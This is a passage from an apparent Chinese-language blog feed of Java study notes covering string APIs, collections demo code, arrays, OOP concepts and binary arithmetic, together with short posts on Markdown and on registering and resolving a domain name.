toUpperCase()    将字符串变为大写    indexOf(String str) 根据指定的字符串返回下标            lastIndexof()    返回最后一次出现的指定字符的下标位置    endsWith()        是否已指定的后缀结尾    startsWith()    是否已指定的前缀开始    subString(int start,int end)    截取一段子字符串(包前不包后)    subString(int start)        截取一段子字符串(包前不包后)    tocharArray()    将字符串转换成一个数组    split()            根据既定的字符进行分割字符串    equalsIgnoreCase() 忽略大小写比较</code></pre><h3 id="四、StringBuilder、StringBuffer"><a href="#四、StringBuilder、StringBuffer" class="headerlink" title="四、StringBuilder、StringBuffer"></a>四、StringBuilder、StringBuffer</h3><pre><code>StringBuilder内部也是对char数组的操作，但是数组内容是可变的，如果长度不够，利用数组边长算法来维护自动扩容长度。StringBuffer 是线程安全的，速度比较慢StringBuilder 非线程安全的，速度比较快StringBuilder与StringBuffer API几乎一模一样</code></pre><h3 id="五、日期"><a href="#五、日期" class="headerlink" title="五、日期"></a>五、日期</h3><pre><code>Date    long + 操作(很多API的方法已经过时了。有BUG)Calender    long + 操作(一般情况都使用Calender)</code></pre><pre><code>     Date内部维护着一个long值     即：1970年至今的毫秒数    Date date = new Date();    System.out.println(date);    long time = date.getTime();    System.out.println(System.currentTimeMillis());    System.out.println(time);</code></pre><pre><code>SimpleDateFormat    Date + 操作  (日期格式的操作)</code></pre><h4 id="解析：-1"><a href="#解析：-1" class="headerlink" title="解析："></a>解析：</h4><p><code>`</code> String dt = new SimpleDateFormat(“yyyy-MM-dd HH:mm:ss EE”).format(calender.getTime());<br>        System.out.println(dt);</p><pre><code>### 六   一、集合    集合底层就是数组    集合的底层就是对象数组 = Object[] objs = new Object[n];    List    LinkedList            LinkedList实现了List接口，能进行队列操作。    LinkedList实现了Deque接口， 能当做双端队列使用。(即：头，尾操作,类似于栈)    #### 解析：  ``` LinkedList&lt;Integer&gt; linkedList = new LinkedList&lt;&gt;();        /****************基本操作**********************/        linkedList.addFirst(0);//添加元素到列表开头        linkedList.add(1);//在列表结尾添加元素        linkedList.add(2, 2);//在指定位置添加元素        linkedList.addLast(3);//添加元素到列表结尾        System.out.println(&quot;linkedList:&quot; + linkedList);            //获取数据        System.out.println(&quot;getFirst():&quot; +linkedList.getFirst());//返回集合中第一个元素        System.out.println(&quot;getLast():&quot; + linkedList.getLast());//返回集合中的最后一个元素        System.out.println(&quot;removeFirst():&quot; + linkedList.removeFirst());//移除并返回集合中的第一个元素        System.out.println(&quot;removeLast():&quot; + linkedList.removeLast());//移除并返回集合中的最后一个元素        System.out.println(&quot;linkedList:&quot; + linkedList);        System.out.println(&quot;contains(1):&quot; + linkedList.contains(1));//判断此集合中指定的元素，如果包含返回true 否则false         位置访问操作        System.out.println(&quot;------------------------------------------------&quot;);        linkedList.set(1, 3);//将此集合中指定位置的元素替换成指定的元素        System.out.println(&quot;After set :&quot; + linkedList);        System.out.println(linkedList.get(1));//获取指定下标位置的元素        linkedList.add(3);        System.out.println(&quot;linkedList:&quot; + linkedList);        System.out.println(&quot;indexOf(3)：&quot; + linkedList.indexOf(3));//返回集合中首次出现的指定元素的索引        System.out.println(&quot;lastIndexOf(3)：&quot; + linkedList.lastIndexOf(3));////返回集合中最后一次出现的指定元素的索引        /*****************Queue操作***********************/        System.out.println(&quot;------------------------------------------&quot;);        //linkedList.clear();//清除集合中所有的元素        System.out.println(linkedList.peek());   //获取但不移除此列表的头        System.out.println(linkedList.element());//获取但不移除此列表的头        //linkedList.clear();//清除集合中所有的元素        /*         * poll()与remove()差异在于poll返回null remove 抛异常         */        System.out.println(&quot;poll():&quot; + linkedList.poll());//获取并移除此列表的头        System.out.println(&quot;After poll :&quot; + linkedList);        System.out.println(&quot;remove():&quot; + linkedList.remove());//获取并移除此列表的头        System.out.println(&quot;After remove :&quot; + linkedList);        System.out.println(&quot;linkedList:&quot; + linkedList);        linkedList.offer(4);//添加元素到列表结尾        System.out.println(&quot;linkedList:&quot; + linkedList);        linkedList.offerFirst(2);//在此列表的开头插入指定元素        System.out.println(&quot;linkedList:&quot; + linkedList);        linkedList.offerLast(5);//在此列表的结尾插入指定元素        System.out.println(&quot;linkedList:&quot; + linkedList);        System.out.println(&quot;-------------------------------------------&quot;);        System.out.println(linkedList.peekFirst());//获取但不移除此列表的头        System.out.println(&quot;linkedList:&quot; + linkedList);        System.out.println(linkedList.peekLast());//获取但不移除此列表的尾部        linkedList.pollFirst();//获取并且移除此列表的头        linkedList.pollLast();//获取并且移除此列表的尾部        linkedList.push(2);//将元素推入此列表所表示的堆栈(插入到列表的头)        System.out.println(&quot;linkedList:&quot; + linkedList);        linkedList.pop();//从此列表所表示的堆栈弹出一个元素(获取并移除第一个元素)        System.out.println(&quot;linkedList:&quot; + linkedList);        linkedList.add(3);        linkedList.removeLastOccurrence(3);//从此列表中移除最后一次出现的指定的元素(遍历)        System.out.println(&quot;linkedList:&quot; + linkedList);        /**********************遍历操作***********************/        System.out.println(&quot;----------------------------&quot;);        linkedList.clear();        for (int i = 0; i &lt; 1000000; i++) {            linkedList.add(i);        }        //迭代器遍历        long start = System.currentTimeMillis();        //获取迭代器        Iterator&lt;Integer&gt; iterator = linkedList.iterator();        /*         * hasNext():判断集合中有没有元素，如果有返回true 否则false         */        while(iterator.hasNext()) {            iterator.next();        }        long end  = System.currentTimeMillis();        System.out.println(&quot;iterator:&quot; + (end - start) + &quot;ms&quot;);        //顺序迭代(随机遍历)/*        start = System.currentTimeMillis();        for (int i = 0; i &lt;linkedList.size(); i++) {            linkedList.get(i);        }        end  = System.currentTimeMillis();        System.out.println(&quot;for:&quot; + (end - start) + &quot;ms&quot;);*/        //foreach循环迭代        start = System.currentTimeMillis();        for (Integer integer : linkedList) {}        end  = System.currentTimeMillis();        System.out.println(&quot;foreach:&quot; + (end - start) + &quot;ms&quot;);        LinkedList&lt;Integer&gt; temp = new LinkedList&lt;&gt;();        temp.addAll(linkedList);        //通过pollFirst或者pollLast来遍历        start = System.currentTimeMillis();        while(linkedList.size()!=0) {            linkedList.pollFirst();        }        end  = System.currentTimeMillis();        System.out.println(&quot;pollFirst:&quot; + (end - start) + &quot;ms&quot;);        System.out.println(linkedList);        //通过removeFirst或者removeLast来遍历        start = System.currentTimeMillis();        while(temp.size()!=0) {            temp.removeFirst();        }        end  = System.currentTimeMillis();        System.out.println(&quot;removeFirst:&quot; + (end - start) + &quot;ms&quot;);    }</code></pre><pre><code>ArrayListArrayList底层是由数组支持，而LinkedList是由双向链表支持的，其中的每个对象包含数据的同时还包含指向链表中前一个与后一个元素的引用.线性算法。``` ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;();    list.add(&quot;one&quot;);    list.add(&quot;two&quot;);    list.add(&quot;three&quot;);    list.add(&quot;four&quot;);    System.out.println(list);    list.remove(2);    System.out.println(list);    list.add(0, &quot;aaa&quot;);    System.out.println(list);    String one = list.get(1);//获取指定下标所对应的元素    System.out.println(one);    list.set(1, &quot;2&quot;);    System.out.println(list);    String old = list.remove(1);    System.out.println(old);    System.out.println(list);    //contains 查看此集合中是否包含指定的元素，如果有 true 否则false    boolean flag = list.contains(&quot;aaa&quot;);    System.out.println(flag);    //isEmpty() 检索次列表是否为空    boolean f = list.isEmpty();    System.out.println(f);    System.out.println(list);    //截取一个子集合,按照包前不包后的原则    List&lt;String&gt; list2 = list.subList(1, 2);    System.out.println(list2);    List&lt;String&gt; list3 = new ArrayList&lt;&gt;();    list3.add(&quot;5&quot;);    list3.add(&quot;6&quot;);    list.addAll(list3);    System.out.println(list);}</code></pre><pre><code>```         List&lt;User&gt; list = new ArrayList&lt;&gt;();        User u1 = new User(&quot;Tom&quot;, &quot;123456&quot;);        User u2 = new User(&quot;Tom&quot;, &quot;123456&quot;);        User u3 = new User(&quot;Tom&quot;, &quot;123456&quot;);        System.out.println(u1.equals(u3));//true        list.add(u1);        list.add(u2);        System.out.println(list);        boolean f = list.remove(new User(&quot;Tom&quot;, &quot;123456&quot;));        System.out.println(f);        System.out.println(list);        boolean f2 = list.contains(new User(&quot;Tom&quot;, &quot;123456&quot;));        System.out.println(f2);//true        /**************************/        LinkedList&lt;User&gt; linkedList = new LinkedList&lt;&gt;();        linkedList.add(u1);        linkedList.add(u2);        System.out.println(linkedList);        boolean f3 = linkedList.contains(new User(&quot;Tom&quot;, &quot;123456&quot;));        System.out.println(f3);//true        /*         * LinkedList中 如果方法中包含First或者last 都不会去隐含调用equals和hashCode         */    }</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> API </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java数组</title>
      <link href="/2019/07/27/java/java3/"/>
      <url>/2019/07/27/java/java3/</url>
      
        <content type="html"><![CDATA[<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="数组的声明方式："><a href="#数组的声明方式：" class="headerlink" title="数组的声明方式："></a>数组的声明方式：</h4><h5 id="1-动态初始化"><a href="#1-动态初始化" class="headerlink" title="1.动态初始化"></a>1.动态初始化</h5><h5 id="2-静态初始化"><a href="#2-静态初始化" class="headerlink" title="2.静态初始化"></a>2.静态初始化</h5><p>动态数组一般就理解成可以无限扩大的容器，二而静态数组就是一开始设定时就规定了其大小<br>动态初始化指在创建时，使用了new对象的方式创建：  </p><p>####格式为：  </p><h5 id="int-arr-new-int-4"><a href="#int-arr-new-int-4" class="headerlink" title="int arr[] =new int [4];"></a>int arr[] =new int [4];</h5><h5 id="int-arr-new-int-1-2-3-4"><a href="#int-arr-new-int-1-2-3-4" class="headerlink" title="int []arr=new int[]{1,2,3,4};"></a>int []arr=new int[]{1,2,3,4};</h5><h4 id="静态初始化个格式："><a href="#静态初始化个格式：" class="headerlink" title="静态初始化个格式："></a>静态初始化个格式：</h4><h5 id="int-arr-1-2-3-4"><a href="#int-arr-1-2-3-4" class="headerlink" title="int arr[]={1,2,3,4};"></a>int arr[]={1,2,3,4};</h5><p>动态是运行期间确定元素值，静态是编译期间确定元素值 ，静态数组一经建立不可以更改。<br>复制扩容的方法改变；</p><h3 id="1-arrays-copyof-src-length-src表示数组名，length表示长度"><a href="#1-arrays-copyof-src-length-src表示数组名，length表示长度" class="headerlink" title="1.arrays.copyof(src,length);src表示数组名，length表示长度"></a>1.arrays.copyof(src,length);src表示数组名，length表示长度</h3><h3 id="2-System-arraycopy-src-srcpos-dest-destpos-length"><a href="#2-System-arraycopy-src-srcpos-dest-destpos-length" class="headerlink" title="2.System.arraycopy(src,srcpos,dest,destpos,length);"></a>2.System.arraycopy(src,srcpos,dest,destpos,length);</h3><p>其中<br>src：数组源  （被复制）<br>srcpos：原数组开始复制的位置<br>dest：目标数组（当前希望复制的数组）<br>destpos：目标数组复制的位置<br>length：复制长度   </p><p>数组的访问都是，从0开始，0表示数组开始的下标<br>数组定义格式</p><h3 id="数组输出方式："><a href="#数组输出方式：" class="headerlink" title="数组输出方式："></a>数组输出方式：</h3><h4 id="System-out-println-arrays-tostring-XX"><a href="#System-out-println-arrays-tostring-XX" class="headerlink" title="System.out.println(arrays.tostring(XX));"></a>System.out.println(arrays.tostring(XX));</h4><h3 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h3><p>public class ArrSortDemo {<br>    public static void main(String[] args) {<br>        Integer[] ary = {2,7,9,3,6,8,1};<br>  //1.可以使用Arrays.sort对数组进行排序<br>        Arrays.sort(ary);<br>        System.out.println(Arrays.toString(ary));<br>        //2.Comparator:是一个接口，这个接口中的compare的方法是自定义排序方法<br>        Arrays.sort(ary,new Comparator<integer>() {<br>            @Override<br>            public int compare(Integer o1, Integer o2) {<br>                return o2-o1;<br>            }<br>        });<br>        System.out.println(Arrays.toString(ary));<br>    }<br>}</integer></p><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><pre><code>栈内存：栈内存是计算机的一种数据存储方式，是Java进程启动的时候在内存中开辟的存储空间。栈内存利用遵循LIFO(后进先出)原则Java中所有的局部变量都在栈内存中分配空间(压入)，方法的参数(形参)也是局部变量，局部变量离开作用域时，收回(从栈内存中弹出)。Java方法调用使用栈实现，递归调用就是栈的操作。</code></pre><p>注意：递归的时候按照递归深度分配全部临时变量，栈内存开销极大，性能不好。<br>在使用递归调用的时候，切记要有跳出条件。如果没有跳出条件，就会爆栈.</p><p>什么时候使用递归？<br>    尽可能不使用。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数组,递归 </tag>
            
            <tag> 原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown</title>
      <link href="/2019/07/23/markdown/"/>
      <url>/2019/07/23/markdown/</url>
      
        <content type="html"><![CDATA[<h5 id="内容如图"><a href="#内容如图" class="headerlink" title="内容如图"></a>内容如图</h5><p>为啥上图呢，因为我的文档就是markdown写的，直接写的话会对文档产生效果，so。<br><img src="http://img.ahdy.top/20190723103212.png" alt><br><img src="http://img.ahdy.top/20190723103225.png" alt><br><img src="http://img.ahdy.top/20190723103233.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名</title>
      <link href="/2019/07/22/yuming/"/>
      <url>/2019/07/22/yuming/</url>
      
        <content type="html"><![CDATA[<h5 id="域名是什么呢？"><a href="#域名是什么呢？" class="headerlink" title="域名是什么呢？"></a>域名是什么呢？</h5><p>我就不解释了昂，不懂可以<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D/86062?fr=aladdin" target="_blank" rel="noopener">百度百科</a>  </p><h5 id="域名获取"><a href="#域名获取" class="headerlink" title="域名获取"></a>域名获取</h5><p>域名在各大服务器运营商可以买到，国内几个知名云，阿里云，腾讯云，百度云，华为云，都可以。只需要百度一下进入他们官网实名认证一下就可以购买了，一般价格在1~？元不等。  </p><h5 id="域名备案"><a href="#域名备案" class="headerlink" title="域名备案"></a>域名备案</h5><p><img src="http://img.ahdy.top/2019-07-22_192041.png" alt><br>如果你购买了一个域名需要完成备案才能正常使用它，备案的过程比较漫长，一般提交审核一个月左右会完成，以前比较麻烦现在可以通过app上传照片及一些相关信息就能完成备案了，以我备案阿里域名的经历，他们会初级审核，如果你有地方不合格他们会电话通知你，直到达到备案所需的最低要求，一般他们审核过再提交给信管局基本上不会有问题。  </p><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>假如你已经有了一个成功备案的域名<br>此时你希望通过域名来访问你的网站，那么就要对域名添加解析记录，将ip地址映射给域名  </p><h5 id="如果你的网站不能直接通过ip地址来访问就需要去修改服务器参数，这里的服务器一般指tomcat等服务器，修改sever-xml-web-xml两个文件，可以指定IP地址访问项目路径下的网站主页，一般默认为index-html，当然这些都是可以修改的，详细操作请百度一下。"><a href="#如果你的网站不能直接通过ip地址来访问就需要去修改服务器参数，这里的服务器一般指tomcat等服务器，修改sever-xml-web-xml两个文件，可以指定IP地址访问项目路径下的网站主页，一般默认为index-html，当然这些都是可以修改的，详细操作请百度一下。" class="headerlink" title="如果你的网站不能直接通过ip地址来访问就需要去修改服务器参数，这里的服务器一般指tomcat等服务器，修改sever.xml,web.xml两个文件，可以指定IP地址访问项目路径下的网站主页，一般默认为index.html，当然这些都是可以修改的，详细操作请百度一下。"></a>如果你的网站不能直接通过ip地址来访问就需要去修改服务器参数，这里的服务器一般指tomcat等服务器，修改sever.xml,web.xml两个文件，可以指定IP地址访问项目路径下的网站主页，一般默认为index.html，当然这些都是可以修改的，详细操作请百度一下。</h5><p>过程如图所示（其他云服务器类似）</p><h5 id="打开控制台"><a href="#打开控制台" class="headerlink" title="打开控制台"></a>打开控制台</h5><p><img src="http://img.ahdy.top/2019-07-22_192335.png" alt></p><h5 id="选择域名"><a href="#选择域名" class="headerlink" title="选择域名"></a>选择域名</h5><p><img src="http://img.ahdy.top/2019-07-22_192442.png" alt></p><h5 id="选择解析"><a href="#选择解析" class="headerlink" title="选择解析"></a>选择解析</h5><p><img src="http://img.ahdy.top/2019-07-22_192522.png" alt></p><h5 id="添加解析记录"><a href="#添加解析记录" class="headerlink" title="添加解析记录"></a>添加解析记录</h5><p><img src="http://img.ahdy.top/2019-07-22_193513.png" alt></p><h4 id="二级域名创建"><a href="#二级域名创建" class="headerlink" title="二级域名创建"></a>二级域名创建</h4><p>步骤一样，选择CNAME<br><img src="http://img.ahdy.top/2019-07-22_195021.png" alt><br>确定后大概十分钟就会生效  </p><h5 id="二级域名应用"><a href="#二级域名应用" class="headerlink" title="二级域名应用"></a>二级域名应用</h5><p>主域名通常用来访问我们的主网页<br>1.二级域名就是主域名分出来域名。</p><p>2.二级域名是寄存在主域名之下的域名，权重低于主域名。</p><p>3.二级域名属于一个独立的分支，他有自己的收录、快照、PR值、反链等。</p><p>4.当主域名受到惩罚，二级域名也会连带惩罚。<br>二级域名可以重定向一个url地址，并且它是免费的，比如以七牛云为例子，七牛云的对象储存会提供一个测试域名，这个测试域名一个月后就会销毁，那么这个测试测试域名所生成的外链都会失效，这时候你就可以绑定一个二级域名用于dns加速，只需要将你绑定二级域名生成的CNAME复制粘贴到域名解析CNAME记录值内就可以了<br><img src="http://img.ahdy.top/2019-07-22_195142.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 域名 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域名 </tag>
            
            <tag> 二级域名 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java难点</title>
      <link href="/2019/07/22/java/java5/"/>
      <url>/2019/07/22/java/java5/</url>
      
        <content type="html"><![CDATA[<h3 id="•-继承"><a href="#•-继承" class="headerlink" title="•  继承"></a>•  继承</h3><p>exdents 关键字 是继承的意思<br>Object类</p><pre><code>Java类默认继承于Object，任何类都继承了Object类的所有属性和方法，其中有三个方法，比较重要：1.toString()    重写了对象的内容。如果不重写toString()，打印对象会打印出地址值。如果重写toString()，将打印toString()方法返回    的指定的字符串。2.equals();    用来比较两个对象是否相等的方法    比较对象分为两种：&quot;引用相等&quot;与&quot;对象相等&quot;    比较引用值是否相等，使用 &quot;==&quot;    比较对象是否相等，使用&quot;equals&quot;    但是 equals需要被重写，因为Object的类的equals方法就是 ==    eques默认的比较规则是地址值的比较。    如果覆盖的话，请规循比较规则：    自反性：    对称性:    传递性:    一致性:3.hashCode();    hachCode方法要与equals方法一同覆盖(规定)    当两个对象equals比较为true时，应具有相同的hashCode值    当两个对象equals比较为false时,应具有不同的hashCode值    hashCode值要稳定，一个对象创建以后就应该在变化。    默认的hashCode值是当前堆对象地址值转换的一个整数，这个整数不是内存地址。    一般使用对象的OID值作为hashCode值。    IOD是对象的唯一编号，在项目中一般采用数据库生成IOD，也就是数据库中的&quot;主键&quot;.</code></pre><h3 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h3><p>重写是发生在父类与子类之间的。</p><p>父类方法被子类方法重写后，一定调用子类的。</p><h3 id="•-多态"><a href="#•-多态" class="headerlink" title="•  多态"></a>•  多态</h3><p>父类引用指向子类实例。</p><p>重写，重载都是多态的一种。</p><p>方法动态绑定对象</p><p>属性静态绑定变量类型</p><h3 id="•-继承中的构造器"><a href="#•-继承中的构造器" class="headerlink" title="•  继承中的构造器"></a>•  继承中的构造器</h3><p>子类构造器一定默认调用父类无参构造器。</p><p>子类优先调用父类无参构造器开辟内存空间,所以，父类空间先加载。</p><h3 id="•-对象的实例化过程"><a href="#•-对象的实例化过程" class="headerlink" title="•  对象的实例化过程"></a>•  对象的实例化过程</h3><h5 id="•-在创建类之前，检查类是否被加载-是将硬盘上的-class文件加载到内存中-，如果没有加载就加载这个类-在这个类被挤在之前要加载所有的父类。"><a href="#•-在创建类之前，检查类是否被加载-是将硬盘上的-class文件加载到内存中-，如果没有加载就加载这个类-在这个类被挤在之前要加载所有的父类。" class="headerlink" title="•  在创建类之前，检查类是否被加载(是将硬盘上的.class文件加载到内存中)，如果没有加载就加载这个类.在这个类被挤在之前要加载所有的父类。"></a>•  在创建类之前，检查类是否被加载(是将硬盘上的.class文件加载到内存中)，如果没有加载就加载这个类.在这个类被挤在之前要加载所有的父类。</h5><p>Java运行时采用的策略：懒惰式加载(按需加载)：如果第一次用到就加载，只加载一次，通过CLASSPATH指定的路径寻找文件(.class),加载以后是一个对象，类型Class.</p><h5 id="•-在内存堆中分配对象空间。递归分配其所有父类和子类属性空间。属性默认自动初始化。"><a href="#•-在内存堆中分配对象空间。递归分配其所有父类和子类属性空间。属性默认自动初始化。" class="headerlink" title="•  在内存堆中分配对象空间。递归分配其所有父类和子类属性空间。属性默认自动初始化。"></a>•  在内存堆中分配对象空间。递归分配其所有父类和子类属性空间。属性默认自动初始化。</h5><p>•  进行属性赋值</p><p>•  递归调用父类构造器(无参)</p><p>•  调用本类构造器</p><p>•  引用类型的转换</p><p>向上转换(隐式/自动类型转换)，是小类型到大类型的转换</p><p>向下转换(强制类型转换),是大类型到小类型的转换</p><p>instanceof 运算符 ,用来检查引用对象的类型,经常与引用类型的强制类型转换配合，实现安全的类型转换，避免类型转换异常。</p><h3 id="•-接口"><a href="#•-接口" class="headerlink" title="•  接口"></a>•  接口</h3><p>我们使用抽象方法或者抽象类来作为系统的分析和设计的工具。用来实现客户关系管理业务的架构。</p><p>接口的特性：</p><p>接口是特殊的抽象类</p><p>接口用来表示纯抽象的概念，没有任何具体的方法。</p><p>接口不能被实例化，可以定义变量</p><p>接口变量可以引用具体实现类的实例(多态)</p><p>接口只能被实现(继承)一个具体类实现接口，必须实现其所有的抽象方法。</p><p>接口的属性，默认是常量public static final</p><p>接口之间可以继承</p><p>一个具体的类可以实现多个接口，实现多继承现象。</p><p>接口中的方法一定是抽象方法。默认缺失public abstract xxx</p><p>实现接口，使用关键字implements，实际上是一种继承关系。</p><h3 id="•-抽象类"><a href="#•-抽象类" class="headerlink" title="•  抽象类"></a>•  抽象类</h3><p>只有行为的概念，没有具体的实现。</p><p>抽象类中的方法可以是抽象方法，也可以被具体化。抽象类不是纯抽象概念</p><p>包含抽象方法的类一定是抽象类。抽象类不能被实例化。只能定义引用变量</p><h3 id="访问控制修饰符"><a href="#访问控制修饰符" class="headerlink" title="访问控制修饰符"></a>访问控制修饰符</h3><pre><code>Java中的访问控制修饰符是修饰Java中类、属性、方法的课间范围。public 任意protected 类        包内        子类[default] 类        包内private        类同一个.java文件当中只能有一个public修饰的类</code></pre><h4 id="static"><a href="#static" class="headerlink" title="static"></a>static</h4><pre><code>静态修饰符.1.static修饰的资源属于类级别，是全体对象实例共享的资源静态属性    使用static修饰，属于整个类的属性。    静态资源是在类加载期间初始化的    静态资源可以直接使用类名.资源名访问。比如：System.out实例属性    属于对象的属性    必须要有对象才能够访问。静态代码块是在类加载期间运行的代码块，由于类只加载一次，所以静态代码块只执行一次。一般用来在类加载以后初始化一些静态资源的时候使用。</code></pre><h4 id="final"><a href="#final" class="headerlink" title="final"></a>final</h4><pre><code>final修饰的类，不能被继承final修饰方法不能被重写final修饰的变量，初始化以后就不能再修改</code></pre><h3 id="JavaBean规范（开发规范）"><a href="#JavaBean规范（开发规范）" class="headerlink" title="JavaBean规范（开发规范）"></a>JavaBean规范（开发规范）</h3><pre><code>JavaBean不是语法规范，是习惯性编程规范，用这个规范写的类比较方便。有的时候，JavaBean的类也称为：POJO类(Plan Old Java Object)简化规范：1.必须有包    项目名、包名、类名、等路径名，不要使用中文。2.Java类，具有无参数构造器3.属性尽可能私有化，方法尽可能公开化    属性私有后提供set、get方法。4.必须实现序列化接口JDK提供的类几乎都符合JavaBean规范。</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 抽象类|接口 </tag>
            
            <tag> 访问控制符 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java面向对象</title>
      <link href="/2019/07/18/java/java4/"/>
      <url>/2019/07/18/java/java4/</url>
      
        <content type="html"><![CDATA[<h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><h4 id="什么是Object-对象-？"><a href="#什么是Object-对象-？" class="headerlink" title="什么是Object(对象)？"></a>什么是Object(对象)？</h4><p>Object是指一个具体的事物实例。<br>面向对象的定义。<br>首先根据客户需求抽象出业务对象，然后对需求进行合理分层。构建相对独立的业务模块，之后设计业务逻辑，利用多态，继承，封装，抽象的编程思想，实现业务需求，最后通过整合各个模块，达到高类聚，低耦合的效果，满足客户需求。</p><h3 id="面向对象分析-面向对象设计"><a href="#面向对象分析-面向对象设计" class="headerlink" title="面向对象分析/面向对象设计"></a>面向对象分析/面向对象设计</h3><p>软件企业广泛采用的一项有效技术，OOAD 在设计中要映射现实生活中指定问题领域中的对象和实体。这种设计要尽可能的接近于现实，即，以最自然的方式表述实体。所以说，面向对象技术的有点就是能构建与现实世界相对应的问题模型，并且保持结构、关系、行为。</p><h3 id="面向对象的概念"><a href="#面向对象的概念" class="headerlink" title="面向对象的概念"></a>面向对象的概念</h3><p>类型(类) 指一个名词的概念<br>引用(变量) 指引用具体概念实例的代词。<br>对象(东西) 指具体概念的个体实例<br>行为    指具体实例的功能/函数/方法<br>多态    行为或者引用，在具体情形下会发生变化的现象。<br>在Java中，多态多表示父类引用指向子类实例<br>封装    任何对象实例都是尽可能封装，减少暴露它的实现细节是不可见的<br>继承    增强代码的可复用性,抽取业务功能的共性。</p><h3 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h3><h4 id="什么是构造器？"><a href="#什么是构造器？" class="headerlink" title="什么是构造器？"></a>什么是构造器？</h4><p>构造对象的函数。<br>构造器的特点：<br>Java中的构造器(构造方法)声明在类内部<br>方法名与类名一直的方法叫构造方法<br>构造方法不能声明返回值类型<br>构造方法可以包含参数，参数一般是创建对象实例必须依赖的条件。<br>任何类都一定有构造器，如果程序员不写构造器，JVM会自动的为该类添<br>一个无参构造器。<br>构造器重载<br>构造器重载指写多个参数不一样的构造器。</p><h3 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h3><p>指当前对象。</p><h4 id="四、方法的重载"><a href="#四、方法的重载" class="headerlink" title="四、方法的重载"></a>四、方法的重载</h4><p>方法的重载是发生在同类中的，方法名一样，方法签名不一样的方法，称为重载。<br>方法的重载与返回值无关。<br>多态，功能的多样性。</p><h3 id="Java参数的传递规则"><a href="#Java参数的传递规则" class="headerlink" title="Java参数的传递规则"></a>Java参数的传递规则</h3><p>Java是基于值的传递，是变量值的复制.<br>基本类型就是其中的值的复制<br>引用类型就是地址值的复制</p><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>提高代码的复用性。抽取业务功能的共通性。<br>继承中有两个概念：<br>父类<br>用来抽取共性代码。<br>子类</p>]]></content>
      
      
      <categories>
          
          <category> Java面向对象 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 对象 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java变量与二进制</title>
      <link href="/2019/07/16/java/java2/"/>
      <url>/2019/07/16/java/java2/</url>
      
        <content type="html"><![CDATA[<h3 id="1-变量"><a href="#1-变量" class="headerlink" title="1.变量"></a>1.变量</h3><p>一、    变量<br>变量相当于自然语言中的代词。比如：“您好”中的您。</p><h3 id="a-变量的分类"><a href="#a-变量的分类" class="headerlink" title="a)    变量的分类"></a>a)    变量的分类</h3><ol><li>成员变量(实例变量、全局变量)-写在类中的</li><li>局部变量(写在方法中的)—随时回收—GC—System.GC</li><li>常量 —不可变<h4 id="b-变量有哪些规则"><a href="#b-变量有哪些规则" class="headerlink" title="b)    变量有哪些规则"></a>b)    变量有哪些规则</h4>Java是强类型语言，在使用变量时，有既定的规则：</li><li>变量必须声明，并初始化以后才能使用</li><li>变量必须有明确的类型</li><li>变量不能重复定义(在相同代码域中)</li><li>变量有作用域<h3 id="二、-进制"><a href="#二、-进制" class="headerlink" title="二、    进制"></a>二、    进制</h3>1.10进制<br>十进制(逢10进1)<br>23678(10进制)=2 <em> 10000 + 3</em> 1000 + 6<em>100 + 7</em> 10 + 8*1<pre><code>            =2*10^4 + 3*10^3+ 6*10^2 + 7*10^1 + 8*10^0            =23678</code></pre></li></ol><h3 id="2-二进制"><a href="#2-二进制" class="headerlink" title="2.二进制"></a>2.二进制</h3><p>   逢2进1 基数是2的进制。<br>权：128 64 32 16 8 4 2 1<br>   15 =  0000 1111<br>   0100 0001(2进制) = 65</p><h3 id="4-补码"><a href="#4-补码" class="headerlink" title="4.    补码"></a>4.    补码</h3><p>1000  -8<br>1001  -7<br>1010  -6<br>1011  -5<br>1100  -4<br>1101   -3<br>1110   -2<br>1111   -1<br>0000   0<br>0001   1<br>0010   2<br>0011   3<br>0100   4<br>0101   5<br>0110  6<br>0111   7<br>在二进制中，符号位(最高位)为0的是正数，为1的是负数.</p><p>-1 + 1 = 0<br>1111 + 0001 = 0<br>        1111</p><pre><code>+        0001    0000</code></pre><p> 在封闭的四位运算中，(超出4位就丢弃)</p><p>1101   -3  ~0010 + 1<br>0011  3      0011<br>计算机中正数和负数的关系是取反加一。举例：~3 + 1 = -3（表示对3取反）<br>补码运算是封闭的，运算结果保留在补码范围内，超出范围就溢出。<br>补码有边界溢出风险。<br>4位二进制补码最多能表示2^4（16）个数，数的范围是-8 7</p><h3 id="16进制："><a href="#16进制：" class="headerlink" title="16进制："></a>16进制：</h3><p>0 – f<br>十六进制中的一个数代表了二进制中4位<br>1234567890<br>二进制：01001001100101100000001011010010<br>十六进制：499602d2</p><p>192</p><p>256 – 192  